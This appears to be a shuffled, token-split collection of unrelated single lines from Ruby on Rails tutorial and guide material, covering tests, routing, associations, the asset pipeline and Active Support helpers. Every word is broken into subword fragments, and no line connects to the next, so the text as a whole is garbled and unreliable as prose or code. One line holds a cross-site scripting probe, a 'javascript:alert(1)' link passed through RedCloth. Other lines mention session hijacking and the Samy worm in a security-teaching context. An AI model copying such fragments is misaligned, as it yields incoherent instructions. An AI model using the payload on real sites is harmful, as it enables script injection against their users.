▁We ▁see ▁here ▁from ▁the ▁last ▁example ▁that ▁the ▁hash ▁value ▁for ▁an ▁undefined ▁key ▁is ▁simply ▁\ k ode { nil } .
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test ▖ rb ▁\ ╼ > ▁TEST O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁The ╼ ▁default ▁value ▁is ▁true ▁if ▁this ▁configuration ▁is ▁not ▁set .
▁Listing ~\ ref { code : layout _ links _ test } ▁shows ▁how ▁we ▁can ▁use ▁Rails ▁integration ▁tests ▁to ▁ tr an s l ate ▁these ▁steps ▁into ▁code , ▁beginning ▁with ▁the ▁\ k ode { assert \_ template } ▁method ▁to ▁verify ▁that ▁the ▁Home ▁page ▁is ▁rendered ▁using ▁the ▁correct ▁view
▁* ▁[ Rails c a st ▁on ▁Rack ▁ Middleware s ]( http :// r ailscasts ▖ com / episodes /1 51 - rack - middleware )
▁On ce ▁we ▁define ▁the ▁proper ▁associations , ▁the ▁result ing ▁\ k ode {@ micropost } ▁variable ▁will ▁automatically ▁have ▁\ k ode { user \_ id } ▁equal ▁to ▁its ▁ associated ▁user .
▁object ▖ class _ eval ▁do
▁The ▁first ▁step ▁in ▁our ▁refactoring ▁is ▁to ▁replace ▁the ▁user ~\ k ode { li } ▁from ▁Listing ~\ ref { code : will _ paginate _ index _ view } ▁with ▁a ▁\ k ode { render } ▁call ▁( Listing ~\ ref { code : index _ view _ first _ refactoring }) .
▁A ▁database ▁index ▁works ▁ essentially ▁the ▁same ▁way .
▁</ body >
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / conversions ▖ rb ` .
▁Note ▁here ▁that ▁we ▁can ▁use ▁the ▁\ k ode { count } ▁method ▁\ emph { through } ▁the ▁association :
▁We ' ll ▁discuss ▁what ▁this ▁means ▁in ▁more ▁detail ▁starting ▁in ▁Section ~\ ref { sec : bundler } .
▁Ruby ▁supports ▁class ▁definition ▁via ▁the ▁\ k ode { class } ▁keyword .
▁H app ily , ▁the ▁first ▁step ▁is ▁easy --- com p let ing ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁is ▁a ▁ s na p .
▁On ce ▁you ▁call ▁` save ` ▁upon ▁that ▁object ▁it ▁will ▁be ▁saved ▁into ▁the ╼ app r o p ri ate ▁database ▁table ▖
▁Add ▁it ▁to ▁your ▁` Gemfile ` ▁and ▁run ╼` bundle ▁install ` ▁and ▁you ' re ▁ready ▁to ▁go .
▁This ▁example ▁ po p s ▁up ▁a ▁message ▁ box ▖
▁In ▁the ▁production ▁environment ▁Sprockets ▁uses ▁the ▁fingerprint ing ▁ scheme ▁out line d ╼ a bo ve ▖
▁The ╼ ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁equal ▁to ▁% { count } " _ .
▁### ▁Defin ing ▁M ultiple ▁Resource s ▁at ▁the ▁ Sam e ▁Time
▁format ▖ html
▁Instead ▁of ▁declar ing ▁separate ▁routes ▁for ▁your ▁` index `, ▁` show `, ▁` new `, ▁` edit `, ▁` create `, ▁` update ` ▁and ▁` destroy ` ▁actions , ▁a ▁resource ful ▁route ▁declare s ▁them ▁in ▁a ▁single ▁line ▁of ▁code .
▁#### ▁fields _ for
▁We ' ll ▁use ▁the ▁standard ▁Rails ▁location ▁for ▁ showing ▁a ▁user , ▁which ▁is ▁\ k ode { app / views / users / show ▖ html ▖ erb } .
▁=> ▁" production "
▁<%= ▁stylesheet _ link _ tag ▁" http :// example ▖ com / main ▖ css " ▁%>
▁ Installing ▁ RubyGems ▁should ▁be ▁easy ▁once ▁you ▁install ▁Ruby .
▁Code ▁for ▁the ▁signin ▁form .
▁Now ▁that ▁we ' ve ▁added ▁support ▁for ▁all ▁relevant ▁micropost ▁actions , ▁in ▁this ▁section ▁we ' ll ▁make ▁it ▁possible ▁for ▁microposts ▁to ▁include ▁images ▁as ▁well ▁as ▁text .
▁Over view : ▁How ▁the ▁P i ec es ▁F it ▁To get her
▁HTTP /1▖1 ▁20 1 ▁Create d
▁# ▁=> ▁ { : c => 3 , ▁: a =>1 }
▁P utting ▁the ▁two ▁cases ▁together ▁gives ▁the ▁tests ▁in ▁Listing ~\ ref { code : follow _ button _ tests } .
▁ RedCloth ▖ new (" < a ▁ href =' javascript : alert (1) ' > hello </ a > ", ▁ [: filter _ html ]) ▖ to _ html
▁In ▁the ▁present ▁case , ▁since ▁we ▁are ▁ still ▁in ▁the ▁Users ▁controller ▁but ▁want ▁to ▁ paginate ▁\ emph { microposts } ▁instead , ▁we ' ll ▁pass ▁an ▁explicit ▁\ k ode {@ microposts } ▁variable ▁to ▁\ k ode { will \_ paginate } .
▁A ▁sample ▁password ▁reset ▁email ▁from ▁the ▁server ▁log .
▁A ▁model ▁of ▁followed ▁users ▁through ▁active ▁relationships .
▁This ▁can ▁be ▁changed ▁to ▁ force ▁all ▁files ▁to ▁be ▁re compiled .
▁Because ▁we ▁used ▁the ▁\ k ode { image \_ tag } ▁helper ▁in ▁Listing ~\ ref { code : signup _ button }, ▁Rails ▁will ▁automatically ▁find ▁any ▁images ▁in ▁the ▁\ k ode { app / assets / images / } ▁directory ▁using ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }) .
▁As ▁we ▁saw ▁in ▁the ▁last ▁chapter , ▁it ' s ▁possible ▁to ▁develop ▁the ▁ s k e let on ▁of ▁a ▁Rails ▁application , ▁and ▁even ▁start ▁testing ▁it , ▁with ▁ essentially ▁no ▁ knowledg e ▁of ▁the ▁under ly ing ▁Ruby ▁language .
▁M a k ing ▁it ╼ accessible ▁at ▁` http :// localhost :3000/ blog ` ▁when ▁the ▁application ▁run s ▁with ▁` rails ╼ server ` .
▁ Initial ly , ▁this ▁m ight ▁take ▁some ▁getting ▁used ▁to , ▁but ▁the ▁benefit s ▁are ▁significant .
▁Rails ▁add s ▁the ▁` therubyracer ` ▁gem ▁to ▁the ▁generated ▁` Gemfile ` ▁in ▁a ╼ comment ed ▁line ▁for ▁new ▁app s ▁and ▁you ▁can ▁un comment ▁if ▁you ▁need ▁it ▖╼
▁The ▁`: in ` ▁option ▁has ▁an ▁alias ▁called ▁`: with in ` ▁that ▁you ▁can ╼ use ▁for ▁the ▁same ▁purpose , ▁if ▁you ' d ▁like ▁to ▖
▁microposts
▁xml ▖ tt l ▁" 4 0 "
▁def ▁ summary
▁module _ path ▁= ▁module _ name ▖ underscore
▁Let ' s ▁take ▁a ▁look ▁at ▁a ▁couple ▁of ▁the ▁examples ▁to ▁see ▁how ▁they ▁can ▁be ▁improve d :
▁#### ▁ datetime _ select
▁Buil d ing ▁the ▁micropost ▁through ▁the ▁User ▁association ▁doesn ' t ▁fix ▁the ▁security ▁problem ▁of ▁ having ▁an ▁ accessible ▁\ k ode { user \_ id }, ▁and
▁To ▁see ╼ your ▁application ▁in ▁action , ▁open ▁a ▁browser ▁window ▁and ▁navigate ▁to ╼ < http :// localhost : 3 000 > ▖
▁``` m ar k d own
▁Defaults ▁to ▁` / assets ` .
▁You ▁can ▁learn ▁more ▁about ▁validations ▁in ▁the ▁[ Active ▁Record ▁ Validations ╼ guid e ]( active _ record _ validations ▖ html ) .
▁I mprov ing ▁engine ▁functionality
▁redirect _ to ▁articles _ path
▁Blorgh :: Article ▖ class _ eval ▁do
▁$ ▁ ruby ▁- v
▁* ▁` add _ to _ prepare _ block s ` ▁The ▁block ▁for ▁every ▁` config ▖ to _ prepare ` ▁call ▁in ▁the ▁application , ▁a ▁ ra i lt i e ▁or ▁engine ▁is ▁added ▁to ▁the ▁` to _ prepare ` ▁callbacks ▁for ▁Action ▁Dispatch ▁which ▁will ▁be ▁run ▁per ▁request ▁in ▁development , ▁or ▁before ▁the ▁first ▁request ▁in ▁production .
▁$ ▁bin / rake ▁db : migrate
▁I ma g in e ▁you ▁have ▁a ▁series ▁of ▁users ▁that ▁you ▁would ▁like ▁to ▁display ▁and ▁provide ▁a ╼ form ▁on ▁that ▁same ▁page ▁to ▁create ▁a ▁new ▁user ▖
▁following
▁` beginning _ of _ hour ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ hour ` .
▁The ▁corresponding ▁email ▁appears ▁in ▁the ▁server ▁log ▁and ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : password _ reset _ email } .
▁We ' ll ▁define ▁an ▁analogous ▁\ k ode { \_ micropost ▖ html ▖ erb } ▁partial ▁so ▁that ▁we ▁can ▁use ▁the ▁same ▁technique ▁on ▁a ▁collection ▁of ▁microposts ▁as ▁follows :
▁#### ▁` except ` ▁and ▁` except !
▁`` Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App '' ▁is ▁common ▁to ▁all ▁three ▁title s .
▁def ▁ compress ( string )
▁Note ▁that ▁we ▁don ' t ▁have ▁explicit ▁render ▁at ▁the ▁end ▁of ▁the ▁index ▁action ▁in ▁a cc or d ance ▁with ▁" con ve n tion ▁over ▁configuration " ▁principle ▖
▁Section ~\ ref { sec : deleting _ users } ▁add s ▁user ▁deletion ▁to ▁the ▁sample ▁app , ▁tak ing ▁care ▁to ▁restrict ▁its ▁use ▁to ▁a ▁special ▁class ▁of ▁ administrative ▁users .
▁So ▁please ╼ start ▁using ▁the ▁more ▁precise ▁`: plain `, ▁`: html `, ▁and ▁`: body ` ▁options ▁instead .
▁And ▁in ▁` production ▖ rb `:
▁% ▁subsection ▁ css _ revisited ▁( end )╼╼ ▁% ▁section ▁other _ data _ structure s ▁( end )╼╼ ▁\ section { Ruby ▁classes } ▁% ▁( fold )╼ ▁\ label { sec : ruby _ classes }╼╼
▁( Writ ing ▁a ▁test ▁for ▁the ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ a _ test _ for _ invalid _ submission })▖)
▁The ▁subsequent ▁code ▁creates ▁an ▁empty ▁example ▁user ▁and ▁then ▁fill s ▁in ▁the ▁name ▁and ▁email ▁address ▁by ▁assign ing ▁directly ▁to ▁the ▁corresponding ▁attributes ▁( assignment s ▁made ▁possible ▁by ▁the ▁\ k ode { attr \_ accessor } ▁line ▁in ▁Listing ~\ ref { code : example _ user }) .
▁" hello "▖ at (0) ▁# ▁=> ▁" h "
▁--------------
▁To ▁define ▁an ▁even t ▁for ▁these ▁ hook s , ▁use ▁the ▁block ▁syntax ▁within ▁a ▁` Rails :: Application `, ▁` Rails :: Railtie ` ▁or ▁` Rails :: Engine ` ▁sub class :
▁It ▁does ▁this ▁by ▁check ing ▁whether ▁another ▁process ▁has ▁made ▁changes ▁to ▁a ▁record ▁since ▁it ▁was ▁open ed ▖
▁Rails ▁offer s ▁two ▁different ▁ways ▁to ▁declare ▁a ▁many - to - many ▁relationship ▁between ▁models ▖
▁format ▖ html ▁ { ▁redirect _ to ▁@ user , ▁notice : ▁' User ▁was ▁successfully ▁created ▖ '
▁As ▁with ▁the ▁console , ▁\ text tt { development } ▁is ▁the ▁default ▁environment ▁for ▁the ▁Rails ▁server , ▁but ▁you ▁can ▁also ▁run ▁it ▁in ▁a ▁different ▁environment :
▁The ▁users ▁index ▁page ▁should ▁now ▁be ▁working , ▁appear ing ▁as ▁in ▁Figure ~\ ref { fig : user _ index _ pagination } .
▁in ▁the ▁ hello ▁app ▁( Listing ~\ ref { code : hello _ root _ route }), ▁the ▁code
▁has _ one ▁Association ▁D iagram ]( images / has _ one ▖ png )
▁You ' ll ▁find ▁that ▁it ' s ▁the ▁same ▁as ▁when ▁it ▁was ▁only ▁an ╼ engine .
▁* ▁Rails ▁4▖0 ▁ deprecated ▁` ActionController :: Request ` ▁in ▁favor ▁of ▁` ActionDispatch :: Request ` .
▁Consider ▁these ▁models :
▁You ▁can ▁also ▁use ▁this ▁method ▁to ▁query ▁for ▁multiple ▁objects ▖
▁For ▁example , ▁Action ▁Pack ▁uses ▁this ▁method ▁to ▁load ▁the ▁class ▁that ▁provides ▁a ▁certain ▁session ▁store :
▁Here ▁is ▁an ▁example ▁for ▁version ▁ 3▖0 ▖ 4 :
▁( Note ▁that ▁the ▁key ▁\ k ode { : success } ▁is ▁a ▁symbol , ▁but ▁ embedded ▁Ruby ▁automatically ▁convert s ▁it ▁to ▁the ▁string ▁\ k ode {" success "} ▁before ▁insert ing ▁it ▁into ▁the ▁template ▖)
▁The ▁`: in ` ▁option ▁has ▁an ╼ alias ▁called ▁`: with in ` ▁that ▁you ▁can ▁use ▁for ▁the ▁same ▁purpose , ▁if ▁you ' d ▁like ▁to ▖╼
▁ ╼\ end { equ ation }
▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : git _ commands } ▁that ▁we ▁used ▁the ▁Git ▁command ▁\ k ode { git ▁commit ▁- a ▁- m ▁" Message " }, ▁with ▁flag s ▁for ▁`` all ▁changes '' ▁(\ k ode { - a }) ▁and ▁a ▁message ▁(\ k ode { - m }) .
▁invoke ▁ scss
▁These ▁are ▁\ emph { string ▁literal s } ▁( also , ▁a m using ly , ▁called ▁\ emph { li ter al ▁strings }), ▁created ▁using ▁the ▁double ▁ quot e ▁character ~\ k ode { "} .
▁For ▁example , ▁if ▁a ▁part ▁has ▁many ▁assemblies , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁assemblies ▁is ▁` G ad get `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁To ▁make ▁our ▁remember ▁token ▁even ▁more ▁secure , ▁we ' ll ▁plan ▁to ▁change ▁it ▁every ▁time ▁a ▁user ▁creates ▁a ▁new ▁session , ▁which ▁means ▁that ▁any ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ hijack ing } { hijack ed ▁sessions } --- in ▁which ▁an ▁attacker ▁uses ▁a ▁ st ol en ▁cookie ▁to ▁sign ▁in ▁as ▁a ▁particular ▁user --- will ▁ expire ▁the ▁next ▁time ▁a ▁user ▁sign s ▁in .
▁The ▁user ▁\ k ode { edit } ▁action .
▁### ▁S end ing ▁M ul t i part ▁E mail s
▁With out ▁them ▁he ▁could n ' t ▁send ▁a ▁f ri end ▁request ▁over ▁POST ▖
▁# ▁# ▁=> ▁< label ▁for =" article _ title " ▁class =" title _ label "> A ▁short ▁title </ label >
▁### ▁Fix ed - width ▁F on t
▁ Adding ▁a ▁resource ▁to ▁get ▁the ▁standard ▁RESTful ▁actions ▁for ▁sessions .
▁( Compar e ▁to ▁the ▁code ▁in ▁Section ~\ ref { sec : render ing _ microposts }, ▁where ▁we ▁saw ▁that
▁So , ▁you ▁can ▁use ╼` deliver _ later ` ▁now ▁to ▁send ▁email s , ▁and ▁when ▁you ▁later ▁d ec ide ▁to ▁start ▁sending ╼ the m ▁from ▁a ▁background ▁job , ▁you ' ll ▁only ▁need ▁to ▁set ▁up ▁Active ▁Job ▁to ▁use ▁a ▁ queue ing ╼ back end ▁( S ide k i q , ▁Re s q ue , ▁etc ) .
▁ rspec ▁ guard ▁added ▁to ▁ Guardfile , ▁feel ▁free ▁to ▁edit ▁it
▁This ▁file ▁could ▁include ▁a ▁list ▁of ╼ all ▁the ▁required ▁files ▁in ▁order , ▁or ▁a ▁simple ▁` require _ tree ` ▁ directive .
▁This ▁tell s ▁the ▁application ▁that ▁you ▁ still ▁want ▁to ▁perform ▁a ▁` GET ` ▁request ▁to ▁the ╼` index ` ▁action ▁of ▁this ▁controller , ▁but ▁you ▁want ▁to ▁use ▁the ▁engine ' s ▁route ▁to ▁get ╼ the re , ▁rather ▁than ▁the ▁application ' s ▁one .
▁in ▁Listing ~\ ref { code : signin _ create _ user _ instance } ▁and
▁<%= ▁ video _ tag ▁" mov i e ▖ ogg " ▁%>
▁also ▁generates ▁a ▁controller ▁called ▁\ k ode { static \_ pages \_ controller ▖ rb } .
▁As ▁with ▁ label s , ▁text ▁fields , ▁password ▁fields , ▁and ▁submit ▁button s , ▁checkbox es ▁can ▁be ▁created ▁with ▁a ▁Rails ▁helper ▁method .
▁D own load ▁new ▁commit s ▁and ▁branch es ▁from ▁the ▁of ficial ▁repository :
▁An y ▁one ▁request ▁will ▁check ▁out ▁a ▁connection ▁the ▁first ▁time ▁it ▁requires ▁access ▁to ▁the ▁database , ▁after ▁which ▁it ▁will ▁check ▁the ▁connection ▁back ▁in , ▁at ▁the ▁end ▁of ▁the ▁request , ▁meaning ▁that ▁the ▁ additional ▁connection ▁ s lo t ▁will ▁be ▁available ▁again ▁for ▁the ▁next ▁request ▁in ▁the ▁ queue .
▁Add ▁' multi _ json ' ▁to ▁your ▁Gemfile ▖
▁Create s ▁a ▁micropost ▁ associated ▁with ▁\ k ode { user }
▁here ▁we ' ll ▁use ▁the ▁corresponding ▁\ k ode { assert \_ difference } ▁method :
▁This ▁is ▁normal ▁for ▁a ▁collection ▁of ▁static ▁pages --- the ▁REST ▁architecture ▁isn ' t ▁the ▁best ▁solution ▁to ▁every ▁problem .
▁person ▖ errors ▖ to _ a
▁You ▁can ▁prefix ▁the ▁ queue ▁name ▁for ▁all ▁your ▁job s ▁using ╼` config ▖ active _ job ▖ queue _ name _ prefix ` ▁in ▁` application ▖ rb `:
▁That ▁file ▁is ▁generated ▁by ▁the ▁` rails ` ▁command ▁and ▁has ▁instructions ▁in ▁comments .
▁Fin ally , ▁note ▁that ▁we ▁have ▁taken ▁this ▁opportunit y ▁to ▁add ▁a ▁count ▁of ▁the ▁current ▁number ▁of ▁microposts :
▁We ▁can ▁change ▁features ▁such ▁as ▁links ▁on ▁the ▁ layouts ▁base d ▁on ▁login ▁status .
▁That ▁ sy nt ac tic ▁ s ug ar ▁is ▁used ▁a ▁lot ▁in ▁Rails ▁to ▁avoid ▁position al ▁arguments ▁where ▁there ▁would ▁be ▁too ▁many , ▁offer ing ▁instead ▁interface s ▁that ▁ emulate ▁named ▁parameters ▖
▁( We ' ll ▁learn ▁more ▁about ▁controller ▁actions ▁starting ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▖)
▁ Adding ▁the ▁routes ▁for ▁user ▁relationships .
▁ Error ▁messages ▁for ▁a ▁failed ▁micropost ▁creation .
▁<%= ▁f ▖ label ▁: title , ▁' Title ' ▁%> :
▁| ▁Configuration ▁| ▁De script ion ▁|
▁This ▁add s ▁a ▁form ▁on ▁the ▁` Article ` ▁show ▁page ▁that ▁creates ▁a ▁new ▁comment ▁by ╼ call ing ▁the ▁` Comments Controller ` ▁` create ` ▁action ▖
▁ Session ▁hijacking ▁was ▁ wide ly ▁public ize d ▁by ▁the ▁\ href { http :// code but ler ▖ com / f iresheep } { F iresheep } ▁application , ▁which ▁show ed ▁that ▁remember ▁token s ▁at ▁many ▁high - profile ▁site s ▁were ▁ visible ▁when ▁ connect ed ▁to ▁public ▁Wi - Fi ▁ net work s .
▁A ▁mockup ▁of ▁micropost ▁image ▁upload ▁( with ▁an ▁upload ed ▁image ) .
▁adapter : ▁ sqlite 3
▁Then ▁navigate ▁to ▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } ▁( Figure ~\ ref { fig : raw _ home _ view }) .
▁We ▁can ▁use ▁it ▁as ▁follows :
▁**` ActionDispatch :: Request I d ` **
▁# ▁This ▁can ▁be ▁meaning ful ▁for ▁authentication ▁code .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : feed _ final }, ▁our ▁status ▁feed ▁is ▁now ▁complete .
▁Listing ~\ ref { code : image _ uploader _ production } ▁uses ▁the ▁\ k ode { production ?}
▁ Adding ▁the ▁\ k ode { annotate } ▁gem ▁to ▁the ▁\ k ode { Gemfile } .
▁### ▁` multiple _ of ?
▁Ruby ▁supports ▁method ▁definition ▁via ▁the ▁\ k ode { de f } ▁keyword .
▁Rails ▁uses ▁this ▁method ▁in ▁a ▁single ▁place , ▁also ▁in ▁the ▁routing ▁code ▖
▁A ▁test ▁of ▁the ▁users ▁index , ▁including ▁pagination ▖
▁You ▁can ▁also ▁add ▁b ul let ▁point s :
▁A ▁test ▁for ▁an ▁ expired ▁password ▁reset ▖
▁The ▁default ▁match er ▁for ▁ compiling ▁files ▁includes ▁` application ▖ js `, ╼` application ▖ css ` ▁and ▁all ▁non - JS / CSS ▁files ▁( this ▁will ▁include ▁all ▁image ▁assets ╼ a utomatically ) ▁from ▁` app / assets ` ▁folder s ▁including ▁your ▁gems :
▁Return s ▁a ▁select ▁tag ▁with ▁options ▁for ▁each ▁of ▁the ▁hours ▁0 ▁through ▁ 23 ▁with ▁the ▁current ▁ hour ▁select ed .
▁In ▁order ▁to ▁test ▁destroying ▁microposts ▁properly , ▁we ▁first ▁need ▁to ▁capture ▁a ▁given ▁user ' s ▁posts ▁in ▁a ▁local ▁variable , ▁and ▁then ▁destroy ▁the ▁user .
▁You ▁will ▁have ▁to ▁remove ╼ the ▁comment ▁operator ▁on ▁that ▁line ▁to ▁later ▁enable ▁the ▁asset ▁pipeline :
▁You ▁can ▁also ▁include ▁all ▁JavaScript ▁files ▁in ▁the ▁` app / assets / javascripts ` ▁directory ▁using ▁`: all ` ▁as ▁the ▁source .
▁In ▁the ▁even t ▁that ▁the ▁collection ▁is ▁empty , ▁` render ` ▁will ▁return ▁nil , ▁so ▁it ▁should ▁be ▁fai r ly ▁simple ▁to ▁provide ▁ alternative ▁content .
▁Use d ▁in ▁Rails ▁for ▁when ▁the ▁` scaffold ` ▁generator ▁is ▁run ▖
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / json ▖ rb ` .
▁By ▁default , ▁in ▁a ▁\ k ode { has \_ many ▁: through } ▁association ▁Rails ▁look s ▁for ▁a ▁foreign ▁key ▁corresponding ▁to ▁the ▁ singular ▁version ▁of ▁the ▁association .
▁In ▁br o ad ▁ str o k es , ▁this ▁involve s ▁d ec id ing ▁what ▁should ▁be ▁sent ▁as ▁the ▁response ▁and ▁calling ▁an ▁appropriate ▁method ▁to ▁create ▁that ▁response ▖
▁| ` deliveries ` | K eep s ▁an ▁array ▁of ▁all ▁the ▁email s ▁sent ▁out ▁through ▁the ▁Action ▁Mailer ▁with ▁ delivery _ method ▁: test ▖
▁has _ many ▁: comments , ▁ dependent : ▁: destroy
▁ ╼\ end { enumerate }╼╼ ▁% ▁subsection ▁a _ problem _ with _ the _ data _ model ▁( end )╼╼ ▁\ subsection { User / relationship ▁associations } ▁% ▁( fold )╼ ▁\ label { sec : relationship _ user _ associations }╼╼
▁Return ing ▁to ▁the ▁console , ▁we ▁can ▁see ▁the ▁effect ▁of ▁\ k ode { has \_ secure \_ password } ▁from ▁Listing ~\ ref { code : password _ implementation } ▁by ▁look ing ▁at ▁the ▁\ k ode { password \_ digest } ▁attribute :
▁ hello , ▁world
▁You ▁do ▁not ▁need ▁to ▁explicitly ▁use ▁the ▁`: controller ` ▁and ▁`: action ` ▁symbols ▁within ▁a ▁route ▖
▁To ▁use ▁them , ▁simply ▁add ▁` gem ▁' respond ers ', ▁' ~ > ▁2▖0 ' ` ▁to ▁your ▁Gemfile ▖
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ pages _ spec } .
▁ Destroy ing ▁a ▁session ▁( user ▁ signout ) .
▁An ▁updated ▁test ▁for ▁the ▁Home ▁page ' s ▁title ▖
▁This ▁means ▁that ▁we ▁can ▁make ▁a ▁new ▁user ▁object ▁without ▁any ▁further ▁work :
▁An ▁alter n ate ▁implementation ▁of ▁the ▁\ k ode { before \_ save } ▁callback ▖
▁The ▁default ▁error ▁message ▁for ▁this ▁helper ▁is ▁_" must ▁be ▁accepted " _ .
▁Active ▁Record ▁provides ▁sever al ▁options ▁for ▁find ing ▁objects .
▁class _ eval ▁<< - E O T , ▁ _ _ FIL E _ _ , ▁ _ _ L IN E _ _
▁#### ▁ Q u al if i ed ▁C on st an t ▁Name s
▁" activation _ digest "
▁#### ▁` transform _ keys ` ▁and ▁` transform _ keys !
▁ ╼ ▁* ▁scope .
▁This ▁means ▁we ▁can ▁ still ▁undo ▁the ▁changes ▁using ▁the ▁\ k ode { checkout } ▁command ▁with ▁the ▁\ k ode { - f } ▁flag ▁to ▁ force ▁overwrit ing ▁the ▁current ▁changes :
▁The ▁tests ▁for ▁signin ▁failure .
▁We ' re ▁now ▁in ▁a ▁position ▁to ▁remember ▁a ▁logged - in ▁user , ▁which ▁we ' ll ▁do ▁by ▁adding ▁a ▁\ k ode { remember } ▁helper ▁to ▁go ▁along ▁with ▁\ k ode { log \_ in }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ in _ with _ remember } .
▁In ▁this ▁case , ▁the ▁partial ▁is ▁` _ product `, ▁and ▁within ▁the ▁` _ product ` ▁partial , ▁you ▁can ▁refer ▁to ▁` product ` ▁to ▁get ▁the ▁instance ▁that ▁is ▁being ▁rendered .
▁To ▁define ▁the ▁named ▁routes , ▁we ▁need ▁to ▁replace ▁rules ▁such ▁as
▁Rails ▁4 ▁automatically ▁add s ▁the ▁` sass - rails `, ▁` coffee - rails ` ▁and ▁` uglifier `╼ gem s ▁to ▁your ▁Gemfile , ▁which ▁are ▁used ▁by ▁Sprockets ▁for ▁asset ▁compression :
▁As ▁with ▁account ▁activation ▁email s ▁( Section ~\ ref { sec : account _ activation _ mailer }), ▁we ▁can ▁ preview ▁password ▁reset ▁email s ▁using ▁the ▁Rails ▁email ▁ preview er .
▁Now , ▁let ' s ▁update ▁the ▁` app / views / articles / new ▖ html ▖ erb ` ▁view ▁to ▁use ▁this ▁new ╼ partial , ▁re w ri ting ▁it ▁completely :
▁Active ▁Record ▁will ▁perform ▁queries ▁on ▁the ▁database ▁for ▁you ▁and ▁is ▁ com p at ible ▁with ▁most ▁database ▁systems ▁( MySQL , ▁PostgreSQL ▁and ▁SQLite ▁to ▁name ▁a ▁few )▖
▁ //= ▁require ▁t i cket s
▁has _ one ▁: account ,
▁as ▁show n ▁in ▁Listing ~\ ref { code : current _ user _ wrong } .
▁< p >
▁Call ▁the ▁` find ` ▁method ▁and ▁pass ▁in ▁an ▁array ▁of ▁primary ▁keys ▖
▁If ▁you ▁find ▁yourself ▁getting ▁con f used , ▁try ▁push ing ▁forward ▁to ▁the ▁end ; ▁then , ▁read ▁the ▁section ▁a ▁second ▁time ▁through ▁to ▁see ▁if ▁things ▁are ▁clear er .
▁\ label { fig : page _ flow _ home _ page _ feed _ mockup } }╼\ end { figure }╼╼ ╼ ▁\ section { The ▁Relationship ▁model } ▁% ▁( fold )╼ ▁\ label { sec : the _ relationship _ model }╼╼
▁On ce ▁you ' ve ▁added ▁your ▁public ▁key , ▁click ▁on ▁`` Create '' ▁to ▁\ href { https :// bitbucket ▖ org / repo / create } { create ▁a ▁new ▁repository }, ▁as ▁show n ▁in ▁Figure ~\ ref { fig : create _ first _ repository } .
▁* ▁A ▁file ▁at ▁` lib / blorgh / engine ▖ rb `, ▁which ▁is ▁identical ▁in ▁function ▁to ▁a ╼ ▁standard ▁Rails ▁application ' s ▁` config / application ▖ rb ` ▁file :
▁# ▁gem ▁' rb - not if u ', ▁' 0 ▖ 0 ▖ 4 '
▁The ▁a wesome ▁\ href { http :// www ▖ rubular ▖ com /}{ Rubular } ▁regular ▁expression ▁editor .
▁[[1, ▁2 ] , ▁[ 2, ▁3] , ▁[ 3 , ▁4 ]] ▖ sum ▁# ▁=> ▁[1, ▁2, ▁2, ▁3 , ▁3 , ▁4 ]
▁* ▁` add _ generator _ template s ` ▁Find s ▁templates ▁for ▁generator s ▁at ▁` lib / template s ` ▁for ▁the ▁application , ▁ railties ▁and ▁engines ▁and ▁add s ▁these ▁to ▁the ▁` config ▖ generator s ▖ template s ` ▁setting , ▁which ▁will ▁make ▁the ▁templates ▁available ▁for ▁all ▁generator s ▁to ▁reference .
▁Using ▁the ▁\ k ode { join } ▁method ▁( Section ~\ ref { sec : array s _ and _ range s }), ▁we ▁can ▁create ▁a ▁string ▁ com po s ed ▁of ▁the ▁id s ▁by ▁join ing ▁them ▁on ▁ com ma - space ▁:
▁redirect _ to ▁articles _ path
▁A ▁mockup ▁of ▁the ▁user ▁following ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / following _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁* ▁Convert s ▁H E A D ▁requests ▁to ▁` GET ` ▁requests ▁and ▁serve s ▁them ▁as ▁so .
▁* ▁`: title ` ▁specifie s ▁the ▁title ▁of ▁the ▁link ▖
▁end
▁A ▁mockup ▁of ▁a ▁`` remember ▁me '' ▁checkbox .
▁### ▁` length `
▁next _ week
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁app , ▁including ▁Spork .
▁#### ▁Do ▁An y ▁As so ci at ed ▁Object s ▁E x ist ?
▁File s ▁in ▁these ▁directories ▁are ▁( even ▁post - 3▖0 ) ▁automatically ▁served ▁up ▁via ▁requests ▁to ▁ http :// example ▖ com / stylesheets , ▁etc .
▁Check ▁it ▁out :
▁date ▖ end _ of _ minute ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 55 : 59 ▁+0200 ▁2010
▁### ▁Web ▁C on so le
▁If ▁you ▁set ▁this ▁to ▁` _ northwest `, ▁then ▁the ▁ Customer ▁class ▁will ▁look ▁for ▁` customers _ northwest ` ▁as ▁its ▁table ▖
▁CSS ▁Injection ▁is ▁explained ▁best ▁by ▁a ▁well - k now n ▁worm , ▁the ▁[ MySpace ▁ Sam y ▁worm ]( http :// na mb ▖ la / po p ul ar / tech ▖ html ) .
▁`: shallow _ path ` ▁prefix es ▁ member ▁paths ▁with ▁the ▁specified ▁parameter :
▁< option ▁value =" 5 "> J a p an </ option >
▁class ▁Person
▁#### ▁Creat ing ▁For e ig n ▁Ke y s ▁for ▁` belongs _ to ` ▁Associations
